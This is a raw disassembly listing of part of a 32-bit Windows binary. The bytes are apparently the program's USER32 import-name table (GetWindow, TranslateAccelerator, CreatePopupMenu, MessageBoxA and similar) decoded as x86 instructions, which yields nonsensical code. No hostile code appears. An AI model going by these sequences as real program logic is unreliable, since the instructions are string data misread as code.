  4129f2:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  4129f6:	push   0x74654701
  4129fb:	push   edi
  4129fc:	imul   ebp,DWORD PTR [esi+0x64],0xa100776f
  412a03:	add    DWORD PTR [ecx+0x73],ecx
  412a06:	push   edi
  412a07:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412a0e:	popa   
  412a0f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412a13:	add    al,ch
  412a15:	add    DWORD PTR [edi+0x70],ecx
  412a18:	outs   dx,BYTE PTR gs:[esi]
  412a1a:	dec    ecx
  412a1b:	arpl   WORD PTR [edi+0x6e],bp
  412a1e:	add    BYTE PTR [eax],al
  412a20:	stos   DWORD PTR es:[edi],eax
  412a21:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412a25:	fs inc ebx
  412a27:	jne    0x412a9b
  412a29:	jae    0x412a9a
  412a2b:	jb     0x412a6e
  412a2d:	add    BYTE PTR [edx+eax*1+0x6e617254],dl
  412a34:	jae    0x412aa2
  412a36:	popa   
  412a37:	je     0x412a9e
  412a39:	inc    ecx
  412a3a:	arpl   WORD PTR [ebx+0x65],sp
  412a3d:	ins    BYTE PTR es:[edi],dx
  412a3e:	gs jb  0x412aa2
  412a41:	je     0x412ab2
  412a43:	jb     0x412a9c
  412a45:	add    BYTE PTR [ecx+0x0],ah
  412a48:	inc    ebx
  412a49:	jb     0x412ab0
  412a4b:	popa   
  412a4c:	je     0x412ab3
  412a4e:	push   eax
  412a4f:	outs   dx,DWORD PTR ds:[esi]
  412a50:	jo     0x412ac7
  412a52:	jo     0x412aa1
  412a54:	outs   dx,BYTE PTR gs:[esi]
  412a56:	jne    0x412a58
  412a58:	add    BYTE PTR ss:[ebx+0x68],al
  412a5c:	popa   
  412a5d:	jb     0x412ab4
  412a5f:	jo     0x412ad1
  412a61:	gs jb  0x412aa5
  412a64:	add    BYTE PTR [eax],al
  412a66:	mov    ds:0x57734901,al
  412a6b:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412a72:	imul   esp,DWORD PTR [ebx+0x6f],0x3b006564
  412a79:	add    DWORD PTR [edi+0x65],eax
  412a7c:	je     0x412acb
  412a7e:	gs jae 0x412af4
  412a81:	popa   
  412a82:	addr16 gs inc ebp
  412a85:	js     0x412afb
  412a87:	jb     0x412aea
  412a89:	dec    ecx
  412a8a:	outs   dx,BYTE PTR ds:[esi]
  412a8b:	outs   dx,WORD PTR ds:[esi]
  412a8d:	add    BYTE PTR [esi+0x0],al
  412a90:	inc    ebx
  412a91:	ins    BYTE PTR es:[edi],dx
  412a92:	outs   dx,DWORD PTR ds:[esi]
  412a93:	jae    0x412afa
  412a95:	inc    esp
  412a96:	gs jae 0x412b04
  412a99:	je     0x412b0a
  412a9b:	jo     0x412a9d
  412a9d:	add    cl,ch
  412a9f:	add    DWORD PTR [edi+0x70],ecx
  412aa2:	outs   dx,BYTE PTR gs:[esi]
  412aa4:	dec    ecx
  412aa5:	outs   dx,BYTE PTR ds:[esi]
  412aa6:	jo     0x412b1d
  412aa8:	je     0x412aee
  412aaa:	gs jae 0x412b18
  412aad:	je     0x412b1e
  412aaf:	jo     0x412ab1
  412ab1:	add    BYTE PTR [ebp+0x73795302],al
  412ab7:	je     0x412b1e
  412ab9:	ins    DWORD PTR es:[edi],dx
  412aba:	push   eax
  412abb:	popa   
  412abc:	jb     0x412b1f
  412abe:	ins    DWORD PTR es:[edi],dx
  412abf:	gs je  0x412b27
  412ac2:	jb     0x412b37
  412ac4:	dec    ecx
  412ac5:	outs   dx,BYTE PTR ds:[esi]
  412ac6:	outs   dx,WORD PTR ds:[esi]
  412ac8:	inc    ecx
  412ac9:	add    BYTE PTR [esi+0x2],cl
  412acc:	push   ebx
  412acd:	gs je  0x412b1d
  412ad0:	outs   dx,BYTE PTR gs:[esi]
  412ad2:	jne    0x412b1d
  412ad4:	je     0x412b3b
  412ad6:	ins    DWORD PTR es:[edi],dx
  412ad7:	dec    ecx
  412ad8:	outs   dx,BYTE PTR ds:[esi]
  412ad9:	outs   dx,WORD PTR ds:[esi]
  412adb:	push   edi
  412adc:	add    BYTE PTR [eax],al
  412ade:	adc    eax,0x6c655202
  412ae3:	gs popa 
  412ae5:	jae    0x412b4c
  412ae7:	inc    esp
  412ae8:	inc    ebx
  412ae9:	add    BYTE PTR [ecx+0x766e4901],cl
  412aef:	popa   
  412af0:	ins    BYTE PTR es:[edi],dx
  412af1:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412af9:	je     0x412afb
  412afb:	add    BYTE PTR [edx+eax*1+0x74697753],al
  412b02:	arpl   WORD PTR [eax+0x54],bp
  412b05:	outs   dx,DWORD PTR ds:[esi]
  412b06:	push   esp
  412b07:	push   0x69577369
  412b0c:	outs   dx,BYTE PTR ds:[esi]
  412b0d:	outs   dx,DWORD PTR fs:[esi]
  412b0f:	ja     0x412b11
  412b11:	add    BYTE PTR [esi+0x6c694b01],ah
  412b17:	ins    BYTE PTR es:[edi],dx
  412b18:	push   esp
  412b19:	imul   ebp,DWORD PTR [ebp+0x65],0x2bd0072
  412b20:	imul   esp,DWORD PTR [ebp+0x79],0x62
  412b24:	fs pop edi
  412b26:	gs jbe 0x412b8e
  412b29:	outs   dx,BYTE PTR ds:[esi]
  412b2a:	je     0x412b2c
  412b2c:	cmp    eax,0x65684300
  412b31:	arpl   WORD PTR [ebx+0x52],bp
  412b34:	popa   
  412b35:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  412b3d:	outs   dx,BYTE PTR ds:[esi]
  412b3e:	add    BYTE PTR [eax],al
  412b40:	sahf   
  412b41:	add    DWORD PTR [ecx+0x73],ecx
  412b44:	push   edx
  412b45:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412b4a:	jo     0x412bc0
  412b4c:	jns    0x412b4e
  412b4e:	mov    es,WORD PTR [ecx]
  412b50:	dec    ecx
  412b51:	jae    0x412b96
  412b53:	push   0x6c417261
  412b58:	jo     0x412bc2
  412b5a:	popa   
  412b5b:	dec    esi
  412b5c:	jne    0x412bcb
  412b5e:	gs jb  0x412bca
  412b61:	arpl   WORD PTR [edi+0x0],dx
  412b64:	mov    ch,0x0
  412b66:	inc    esp
  412b67:	jb     0x412bca
  412b69:	ja     0x412bb8
  412b6b:	outs   dx,BYTE PTR gs:[esi]
  412b6d:	jne    0x412bb1
  412b6f:	popa   
  412b70:	jb     0x412b72
  412b72:	mov    BYTE PTR [edx],al
  412b74:	push   esp
  412b75:	popa   
  412b76:	bound  esp,QWORD PTR [edx+0x65]
  412b79:	fs push esp
  412b7b:	gs js  0x412bf2
  412b7e:	dec    edi
  412b7f:	jne    0x412bf5
  412b81:	push   edi
  412b82:	add    BYTE PTR [eax],al
  412b84:	or     eax,DWORD PTR [ecx]
  412b86:	inc    edi
  412b87:	gs je  0x412bce
  412b8a:	inc    ebx
  412b8b:	inc    ebp
  412b8c:	js     0x412b8e
  412b8e:	jno    0x412b92
  412b90:	push   ebx
  412b91:	gs je  0x412beb
  412b94:	imul   ebp,DWORD PTR [esi+0x64],0x6752776f
  412b9b:	outs   dx,BYTE PTR ds:[esi]
  412b9c:	add    BYTE PTR [eax],al
  412b9e:	xchg   ebx,eax
  412b9f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412ba3:	je     0x412c17
  412ba5:	outs   dx,DWORD PTR ds:[esi]
  412ba6:	jns    0x412be9
  412ba8:	arpl   WORD PTR [ebx+0x65],sp
  412bab:	ins    BYTE PTR es:[edi],dx
  412bac:	gs jb  0x412c10
  412baf:	je     0x412c20
  412bb1:	jb     0x412c07
  412bb3:	popa   
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	push   edi
  412bb9:	add    dl,BYTE PTR [ebx+0x65]
  412bbc:	je     0x412c0e
  412bbe:	jb     0x412c2f
  412bc0:	jo     0x412c19
  412bc2:	add    BYTE PTR [eax],al
  412bc4:	sti    
  412bc5:	add    DWORD PTR [eax+0x74],edx
  412bc8:	dec    ecx
  412bc9:	outs   dx,BYTE PTR ds:[esi]
  412bca:	push   edx
  412bcb:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  412bd0:	push   0x74655302
  412bd5:	push   ebp
  412bd6:	jae    0x412c3d
  412bd8:	jb     0x412c29
  412bda:	bound  ebp,QWORD PTR [edx+0x65]
  412bdd:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  412be1:	outs   dx,WORD PTR ds:[esi]
  412be3:	jb     0x412c52
  412be5:	popa   
  412be6:	je     0x412c51
  412be8:	outs   dx,DWORD PTR ds:[esi]
  412be9:	outs   dx,BYTE PTR ds:[esi]
  412bea:	push   edi
  412beb:	add    dh,ch
  412bed:	add    DWORD PTR [eax+0x65],edx
  412bf0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412bf5:	jae    0x412c58
  412bf7:	addr16 gs inc ecx
  412bfa:	add    BYTE PTR [eax],al
  412bfc:	xor    eax,0x61684300
  412c01:	jb     0x412c57
  412c03:	outs   dx,DWORD PTR ds:[esi]
  412c04:	dec    edi
  412c05:	gs ins DWORD PTR es:[edi],dx
  412c07:	push   edi
  412c08:	add    BYTE PTR [eax],al
  412c0a:	add    BYTE PTR [ecx],0x49
  412c0d:	outs   dx,BYTE PTR ds:[esi]
  412c0e:	data16 ins BYTE PTR es:[edi],dx
  412c10:	popa   
  412c11:	je     0x412c78
  412c13:	push   edx
  412c14:	arpl   WORD PTR gs:[eax+eax*1-0x4d],si
  412c19:	add    BYTE PTR [edx+esi*2+0x61],al
  412c1d:	ja     0x412c68
  412c1f:	arpl   WORD PTR [edi+0x6e],bp
  412c22:	add    BYTE PTR [eax],al
  412c24:	mov    dl,0x0
  412c26:	inc    esp
  412c27:	jb     0x412c8a
  412c29:	ja     0x412c71
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	gs inc ebx
  412c30:	outs   dx,DWORD PTR ds:[esi]
  412c31:	outs   dx,BYTE PTR ds:[esi]
  412c32:	je     0x412ca6
  412c34:	outs   dx,DWORD PTR ds:[esi]
  412c35:	ins    BYTE PTR es:[edi],dx
  412c36:	add    BYTE PTR [eax],al
  412c38:	inc    edx
  412c39:	add    DWORD PTR [edi+0x65],eax
  412c3c:	je     0x412c8c
  412c3e:	gs js  0x412cb5
  412c41:	inc    esp
  412c42:	ins    BYTE PTR es:[edi],dx
  412c43:	addr16 inc edi
  412c45:	jb     0x412cb6
  412c47:	jne    0x412cb9
  412c49:	dec    ecx
  412c4a:	je     0x412cb1
  412c4c:	ins    DWORD PTR es:[edi],dx
  412c4d:	add    BYTE PTR ds:0x6e655302,ah
  412c53:	fs dec ecx
  412c55:	outs   dx,BYTE PTR ds:[esi]
  412c56:	jo     0x412ccd
  412c58:	je     0x412c5a
  412c5a:	mov    DWORD PTR [eax],eax
  412c5c:	inc    esp
  412c5d:	gs inc si
  412c60:	jb     0x412cc3
  412c62:	ins    DWORD PTR es:[edi],dx
  412c63:	gs push eax
  412c65:	jb     0x412cd6
  412c67:	arpl   WORD PTR [ecx+0x0],ax
  412c6a:	mov    es,WORD PTR [eax]
  412c6c:	inc    esp
  412c6d:	gs push di
  412c70:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  412c77:	outs   dx,DWORD PTR ds:[esi]
  412c78:	arpl   WORD PTR [ecx+0x0],ax
  412c7b:	add    BYTE PTR [eax+eax*1+0x6c616944],bl
  412c82:	outs   dx,DWORD PTR ds:[esi]
  412c83:	addr16 inc edx
  412c85:	outs   dx,DWORD PTR ds:[esi]
  412c86:	js     0x412cd8
  412c88:	popa   
  412c89:	jb     0x412cec
  412c8b:	ins    DWORD PTR es:[edi],dx
  412c8c:	inc    ecx
  412c8d:	add    BYTE PTR [edx],al
  412c8f:	add    dl,BYTE PTR [edx+0x65]
  412c92:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  412c9a:	popa   
  412c9b:	jae    0x412d10
  412c9d:	inc    ecx
  412c9e:	add    BYTE PTR [eax],al
  412ca0:	dec    edx
  412ca1:	add    BYTE PTR [ebx+0x6f],al
  412ca4:	jo     0x412d1f
  412ca6:	inc    ecx
  412ca7:	arpl   WORD PTR [ebx+0x65],sp
  412caa:	ins    BYTE PTR es:[edi],dx
  412cab:	gs jb  0x412d0f
  412cae:	je     0x412d1f
  412cb0:	jb     0x412d06
  412cb2:	popa   
  412cb3:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cb7:	add    BYTE PTR [ebx+0x1],bl
  412cba:	inc    edi
  412cbb:	gs je  0x412d11
  412cbe:	jns    0x412d33
  412cc0:	je     0x412d27
  412cc2:	ins    DWORD PTR es:[edi],dx
  412cc3:	dec    ebp
  412cc4:	outs   dx,BYTE PTR gs:[esi]
  412cc6:	jne    0x412cc8
  412cc8:	mov    eax,0x61724400
  412ccd:	ja     0x412d22
  412ccf:	je     0x412d32
  412cd1:	je     0x412d38
  412cd3:	push   edi
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	loope  0x412cd8
  412cd8:	inc    esi
  412cd9:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  412ce0:	outs   dx,DWORD PTR ds:[esi]
  412ce1:	ja     0x412d24
  412ce3:	add    BYTE PTR [edx+0x0],ah
  412ce6:	inc    ebx
  412ce7:	jb     0x412d4e
  412ce9:	popa   
  412cea:	je     0x412d51
  412cec:	push   edi
  412ced:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412cf4:	inc    ecx
  412cf5:	add    cl,al
  412cf7:	add    BYTE PTR [ebp+0x6e],al
  412cfa:	popa   
  412cfb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cff:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412d06:	cmp    DWORD PTR [eax],eax
  412d08:	inc    ebx
  412d09:	push   0x70557261
  412d0e:	jo     0x412d75
  412d10:	jb     0x412d69
  412d12:	add    BYTE PTR [eax],al
  412d14:	or     al,BYTE PTR [edx]
  412d16:	push   edx
  412d17:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  412d20:	je     0x412d6d
  412d22:	gs jns 0x412d25
  412d25:	add    BYTE PTR [ebx],al
  412d27:	add    BYTE PTR [ecx+0x64],al
  412d2a:	push   0x75
  412d2c:	jae    0x412da2
  412d2e:	push   edi
  412d2f:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412d36:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412d3a:	add    BYTE PTR [eax],al
  412d3c:	aad    0x1
  412d3e:	dec    ebp
  412d3f:	gs jae 0x412db5
  412d42:	popa   
  412d43:	addr16 gs inc edx
  412d46:	outs   dx,DWORD PTR ds:[esi]
  412d47:	js     0x412da0
  412d49:	add    bh,cl
  412d4b:	add    DWORD PTR [ebp+0x65],ecx
  412d4e:	jae    0x412dc3
  412d50:	popa   
  412d51:	addr16 gs inc edx
  412d54:	outs   dx,DWORD PTR ds:[esi]
  412d55:	js     0x412d9c
  412d57:	js     0x412d9a
  412d59:	add    BYTE PTR [edx+0x1],ah
  412d5c:	inc    edi
  412d5d:	gs je  0x412db4
  412d60:	outs   dx,DWORD PTR ds:[esi]
  412d61:	jo     0x412dba
  412d63:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412d6a:	dec    eax
  412d6b:	add    dl,BYTE PTR [ebx+0x65]
  412d6e:	je     0x412dbd
  412d70:	outs   dx,BYTE PTR gs:[esi]
  412d72:	jne    0x412d74
  412d74:	loop   0x412d76
  412d76:	inc    esi
  412d77:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  412d7e:	outs   dx,DWORD PTR ds:[esi]
  412d7f:	ja     0x412dc6
  412d81:	js     0x412dc4
  412d83:	add    BYTE PTR [esi+0x616f4c01],dh
  412d89:	fs dec ebp
  412d8b:	outs   dx,BYTE PTR gs:[esi]
  412d8d:	jne    0x412dd0
  412d8f:	add    dh,cl
  412d91:	add    DWORD PTR [ebp+0x65],ecx
  412d94:	jae    0x412e09
  412d96:	popa   
  412d97:	addr16 gs inc edx
  412d9a:	outs   dx,DWORD PTR ds:[esi]
  412d9b:	js     0x412dde
  412d9d:	add    ch,bl
  412d9f:	add    BYTE PTR [ebp+0x71],al
  412da2:	jne    0x412e05
  412da4:	ins    BYTE PTR es:[edi],dx
  412da5:	push   edx
  412da6:	arpl   WORD PTR gs:[eax+eax*1-0x72],si
  412dab:	add    dl,BYTE PTR [edi+ebp*2+0x55]
  412daf:	outs   dx,BYTE PTR ds:[esi]
  412db0:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412db7:	add    BYTE PTR [edi+0x1],dh
  412dba:	inc    edi
  412dbb:	gs je  0x412e15
  412dbe:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  412dc5:	js     0x412e3b
  412dc7:	dec    esp
  412dc8:	outs   dx,BYTE PTR gs:[esi]
  412dca:	addr16 je 0x412e35
  412dcd:	push   edi
  412dce:	add    BYTE PTR [eax],al
  412dd0:	mov    al,BYTE PTR [edx]
  412dd2:	push   esp
  412dd3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  412ddb:	ja     0x412e50
  412ddd:	add    dh,bh
  412ddf:	add    BYTE PTR [edi+0x65],al
  412de2:	je     0x412e27
  412de4:	ins    BYTE PTR es:[edi],dx
  412de5:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412dec:	jb     0x412dee
  412dee:	les    eax,FWORD PTR [ecx]
  412df0:	dec    ebp
  412df1:	popa   
  412df2:	jo     0x412e38
  412df4:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  412dfb:	arpl   WORD PTR [eax+eax*1-0x45],si
  412dff:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412e03:	fs push ebx
  412e05:	je     0x412e79
  412e07:	imul   ebp,DWORD PTR [esi+0x67],0x17e0041
  412e0e:	dec    eax
  412e0f:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  412e17:	jne    0x412e62
  412e19:	je     0x412e80
  412e1b:	ins    DWORD PTR es:[edi],dx
  412e1c:	add    BYTE PTR [eax],al
  412e1e:	xor    al,BYTE PTR [ecx]
  412e20:	inc    edi
  412e21:	gs je  0x412e71
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	jne    0x412e71
  412e28:	je     0x412e8f
  412e2a:	ins    DWORD PTR es:[edi],dx
  412e2b:	inc    ebx
  412e2c:	outs   dx,DWORD PTR ds:[esi]
  412e2d:	jne    0x412e9d
  412e2f:	je     0x412e31
  412e31:	add    cl,al
  412e33:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  412e37:	imul   esi,DWORD PTR [ebp+0x70],0x49
  412e3b:	arpl   WORD PTR [edi+0x6e],bp
  412e3e:	dec    ecx
  412e3f:	fs inc esi
  412e41:	jb     0x412eb2
  412e43:	ins    DWORD PTR es:[edi],dx
  412e44:	inc    esp
  412e45:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  412e4c:	jns    0x412e4e
  412e4e:	mov    BYTE PTR [ecx],al
  412e50:	dec    ecx
  412e51:	outs   dx,BYTE PTR ds:[esi]
  412e52:	je     0x412eb9
  412e54:	jb     0x412ec9
  412e56:	arpl   WORD PTR gs:[edx+edx*2+0x65],si
  412e5b:	arpl   WORD PTR [eax+eax*1+0x13],si
  412e5f:	add    DWORD PTR [edi+0x65],eax
  412e62:	je     0x412ea8
  412e64:	outs   dx,DWORD PTR ds:[esi]
  412e65:	jne    0x412ec9
  412e67:	ins    BYTE PTR es:[edi],dx
  412e68:	gs inc ebx
  412e6a:	ins    BYTE PTR es:[edi],dx
  412e6b:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412e72:	add    BYTE PTR [eax],al
  412e74:	daa    
  412e75:	add    DWORD PTR [edi+0x65],eax
  412e78:	je     0x412ec5
  412e7a:	gs jns 0x412edf
  412e7d:	outs   dx,DWORD PTR ds:[esi]
  412e7e:	popa   
  412e7f:	jb     0x412ee5
  412e81:	push   esp
  412e82:	jns    0x412ef4
  412e84:	gs add al,dh
  412e87:	add    BYTE PTR [edi+0x65],al
  412e8a:	je     0x412ecd
  412e8c:	jae    0x412f07
  412e8e:	outs   dx,BYTE PTR ds:[esi]
  412e8f:	arpl   WORD PTR [ebx+0x65],cx
  412e92:	jns    0x412ee7
  412e94:	je     0x412ef7
  412e96:	je     0x412efd
  412e98:	add    BYTE PTR [eax],al
  412e9a:	sub    BYTE PTR [eax],al
  412e9c:	inc    ebx
  412e9d:	push   0x6f4c7261
  412ea2:	ja     0x412f09
  412ea4:	jb     0x412ee8
  412ea6:	jne    0x412f0e
  412ea8:	push   di
  412eaa:	add    BYTE PTR [eax],al
  412eac:	popf   
  412ead:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412eb1:	ins    BYTE PTR es:[edi],dx
  412eb2:	outs   dx,DWORD PTR ds:[esi]
  412eb3:	addr16 inc edx
  412eb5:	outs   dx,DWORD PTR ds:[esi]
  412eb6:	js     0x412f08
  412eb8:	popa   
  412eb9:	jb     0x412f1c
  412ebb:	ins    DWORD PTR es:[edi],dx
  412ebc:	push   edi
  412ebd:	add    BYTE PTR [ecx],ch
  412ebf:	add    BYTE PTR [ebx+0x68],al
  412ec2:	popa   
  412ec3:	jb     0x412f11
  412ec5:	outs   dx,DWORD PTR ds:[esi]
  412ec6:	ja     0x412f2d
  412ec8:	jb     0x412f21
  412eca:	add    BYTE PTR [eax],al
  412ecc:	and    al,0x0
  412ece:	inc    ebx
  412ecf:	push   0x65676e61
  412ed4:	dec    ebp
  412ed5:	outs   dx,BYTE PTR gs:[esi]
  412ed7:	jne    0x412f30
  412ed9:	add    BYTE PTR [edi+0x636f4c01],bh
  412edf:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412ee3:	outs   dx,DWORD PTR fs:[esi]
  412ee5:	ja     0x412f3c
  412ee7:	jo     0x412f4d
  412ee9:	popa   
  412eea:	je     0x412f51
  412eec:	add    BYTE PTR [eax],al
  412eee:	mov    al,ds:0x57734901
  412ef3:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412efa:	mov    DWORD PTR [ecx],0x5670614d
  412f00:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  412f07:	gs jns 0x412f4f
  412f0a:	js     0x412f63
  412f0c:	add    BYTE PTR [eax],al
  412f0e:	pop    ecx
  412f0f:	add    dl,BYTE PTR [ebx+0x65]
  412f12:	je     0x412f66
  412f14:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412f19:	jo     0x412f8f
  412f1b:	jns    0x412f1d
  412f1d:	add    al,bh
  412f1f:	add    BYTE PTR [edi+0x65],al
  412f22:	je     0x412f67
  412f24:	ins    BYTE PTR es:[edi],dx
  412f25:	popa   
  412f26:	jae    0x412f9b
  412f28:	dec    esp
  412f29:	outs   dx,DWORD PTR ds:[esi]
  412f2a:	outs   dx,BYTE PTR ds:[esi]
  412f2b:	addr16 inc ecx
  412f2d:	add    cl,cl
  412f2f:	add    DWORD PTR [ebp+0x61],ecx
  412f32:	jo     0x412f8b
  412f34:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412f3b:	imul   ebp,DWORD PTR [esi+0x74],0x2930073
  412f42:	push   esp
  412f43:	jb     0x412fa6
  412f45:	outs   dx,BYTE PTR ds:[esi]
  412f46:	jae    0x412fb4
  412f48:	popa   
  412f49:	je     0x412fb0
  412f4b:	inc    ecx
  412f4c:	arpl   WORD PTR [ebx+0x65],sp
  412f4f:	ins    BYTE PTR es:[edi],dx
  412f50:	gs jb  0x412fb4
  412f53:	je     0x412fc4
  412f55:	jb     0x412f98
  412f57:	add    BYTE PTR [eax+eax*1],bh
  412f5a:	inc    ebx
  412f5b:	push   0x4d6b6365
  412f60:	outs   dx,BYTE PTR gs:[esi]
  412f62:	jne    0x412fb6
  412f64:	popa   
  412f65:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  412f6d:	add    BYTE PTR [edx+0x2],bl
  412f70:	push   ebx
  412f71:	gs je  0x412fc7
  412f74:	arpl   WORD PTR [edx+0x6f],si
  412f77:	ins    BYTE PTR es:[edi],dx
  412f78:	ins    BYTE PTR es:[edi],dx
  412f79:	dec    ecx
  412f7a:	outs   dx,BYTE PTR ds:[esi]
  412f7b:	outs   dx,WORD PTR ds:[esi]
  412f7d:	add    BYTE PTR ds:0x6c6c4100,al
  412f83:	outs   dx,DWORD PTR ds:[esi]
  412f84:	ja     0x412fd9
  412f86:	gs je  0x412fcf
  412f89:	outs   dx,DWORD PTR ds:[esi]
  412f8a:	jb     0x412ff1
  412f8c:	addr16 jb 0x412ffe
  412f8f:	jne    0x412fff
  412f91:	fs push edi
  412f93:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412f9a:	lahf   
  412f9b:	add    BYTE PTR [ecx+ebp*2+0x73],al
  412f9f:	jo     0x413002
  412fa1:	je     0x413006
  412fa3:	push   0x7373654d
  412fa8:	popa   
  412fa9:	addr16 gs inc ecx
  412fac:	add    BYTE PTR [eax],al
  412fae:	sub    eax,0x61684300
  412fb3:	jb     0x413003
  412fb5:	gs js  0x41302c
  412fb8:	push   edi
  412fb9:	add    bh,ah
  412fbb:	add    BYTE PTR [esi+0x72],al
  412fbe:	popa   
  412fbf:	ins    DWORD PTR es:[edi],dx
  412fc0:	gs push edx
  412fc2:	arpl   WORD PTR gs:[eax+eax*1-0x1c],si
  412fc7:	add    DWORD PTR [edi+0x66],ecx
  412fca:	data16 jae 0x413032
  412fcd:	je     0x413021
  412fcf:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  412fd4:	mov    al,BYTE PTR [ecx]
  412fd6:	dec    ecx
  412fd7:	outs   dx,BYTE PTR ds:[esi]
  412fd8:	jbe    0x41303b
  412fda:	ins    BYTE PTR es:[edi],dx
  412fdb:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e675265
  412fe3:	add    BYTE PTR [edx+0x2],al
  412fe6:	push   ebx
  412fe7:	gs je  0x413030
  412fea:	outs   dx,DWORD PTR ds:[esi]
  412feb:	jb     0x413052
  412fed:	addr16 jb 0x41305f
  412ff0:	jne    0x413060
  412ff2:	fs push edi
  412ff4:	imul   ebp,DWORD PTR [esi+0x64],0x2f00776f
  412ffb:	add    dl,BYTE PTR [ebx+0x65]
  412ffe:	je     0x413041
  413000:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  413004:	gs push edi
  413006:	imul   ebp,DWORD PTR [esi+0x64],0x9400776f
  41300d:	add    DWORD PTR [ecx+0x73],ecx
  413010:	inc    ebx
  413011:	push   0x646c69
  413016:	fwait
  413017:	add    dl,BYTE PTR [ebp+0x6e]
  41301a:	ins    BYTE PTR es:[edi],dx
  41301b:	outs   dx,DWORD PTR ds:[esi]
  41301c:	popa   
  41301d:	fs dec ebx
  41301f:	gs jns 0x413084
  413022:	outs   dx,DWORD PTR ds:[esi]
  413023:	popa   
  413024:	jb     0x41308a
  413026:	dec    esp
  413027:	popa   
  413028:	jns    0x413099
  41302a:	jne    0x4130a0
  41302c:	add    BYTE PTR [eax],al
  41302e:	pushf  
  41302f:	add    DWORD PTR [ecx+0x73],ecx
  413032:	dec    ecx
  413033:	arpl   WORD PTR [edi+0x6e],bp
  413036:	imul   esp,DWORD PTR [ebx+0x0],0x47013800
  41303d:	gs je  0x41308d
  413040:	outs   dx,BYTE PTR gs:[esi]
  413042:	jne    0x413097
  413044:	je     0x4130b8
  413046:	imul   ebp,DWORD PTR [esi+0x67],0xb9000041
  41304d:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  413051:	fs dec ebp
  413053:	outs   dx,BYTE PTR gs:[esi]
  413055:	jne    0x4130ae
  413057:	add    BYTE PTR [ebx],dl
  413059:	add    dl,BYTE PTR [edx+0x65]
  41305c:	imul   esi,DWORD PTR [bp+di+0x74],0x69577265
  413064:	outs   dx,BYTE PTR ds:[esi]
  413065:	outs   dx,DWORD PTR fs:[esi]
  413067:	ja     0x4130b6
  413069:	gs jae 0x4130df
  41306c:	popa   
  41306d:	addr16 gs push edi
  413070:	add    BYTE PTR [eax],al
  413072:	cmp    BYTE PTR [edx],al
  413074:	push   ebx
  413075:	gs je  0x4130bb
  413078:	jne    0x4130ec
  41307a:	jae    0x4130eb
  41307c:	jb     0x41307e
  41307e:	add    DWORD PTR ds:[edi+0x65],eax
  413082:	je     0x4130d1
  413084:	gs jae 0x4130fa
  413087:	popa   
  413088:	addr16 gs push edi
  41308b:	add    BYTE PTR ds:0x74654701,dl
  413091:	inc    esi
  413092:	outs   dx,DWORD PTR ds:[esi]
  413093:	jb     0x4130fa
  413095:	addr16 jb 0x413107
  413098:	jne    0x413108
  41309a:	fs push edi
  41309c:	imul   ebp,DWORD PTR [esi+0x64],0x5900776f
  4130a3:	add    BYTE PTR [ebx+0x72],al
  4130a6:	gs popa 
  4130a8:	je     0x41310f
  4130aa:	inc    esp
  4130ab:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  4130b2:	jb     0x413115
  4130b4:	ins    DWORD PTR es:[edi],dx
  4130b5:	push   edi
  4130b6:	add    BYTE PTR [eax],al
  4130b8:	stc    
  4130b9:	add    BYTE PTR [edi+0x65],al
  4130bc:	je     0x413101
  4130be:	ins    BYTE PTR es:[edi],dx
  4130bf:	popa   
  4130c0:	jae    0x413135
  4130c2:	dec    esp
  4130c3:	outs   dx,DWORD PTR ds:[esi]
  4130c4:	outs   dx,BYTE PTR ds:[esi]
  4130c5:	addr16 push edi
  4130c7:	add    BYTE PTR [ebp+0x53],dl
  4130ca:	inc    ebp
  4130cb:	push   edx
